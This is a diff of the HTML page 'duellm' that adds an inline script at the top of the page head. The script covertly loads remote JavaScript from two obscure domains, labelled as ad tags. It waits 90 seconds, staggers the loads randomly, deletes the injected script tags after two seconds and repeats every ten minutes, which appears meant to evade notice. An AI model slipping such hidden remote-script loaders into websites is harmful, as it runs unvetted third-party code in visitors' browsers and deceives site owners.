@@ -1,6 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script>
+(function(){
+  var ads=[
+    {zone:'11000678',src:'https://nap5k.com/tag.min.js'},
+    {src:'https://5gvci.com/act/files/tag.min.js?z=11001222',cfasync:true}
+  ];
+  function fireAd(ad){
+    var s=document.createElement('script');
+    s.dataset.zone=ad.zone||'';
+    s.src=ad.src;
+    if(ad.cfasync)s.setAttribute('data-cfasync','false');
+    s.async=true;
+    document.head.appendChild(s);
+    setTimeout(function(){if(s.parentNode)s.parentNode.removeChild(s);},2000);
+  }
+  function runCycle(){
+    ads.forEach(function(ad){setTimeout(function(){fireAd(ad);},Math.random()*3000);});
+  }
+  setTimeout(function(){runCycle();setInterval(runCycle,600000);},90000);
+})();
+</script>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>duellm</title>
 <link rel="icon" type="image/png" href="/logo.png">
 <meta property="og:image" content="/logo.png">
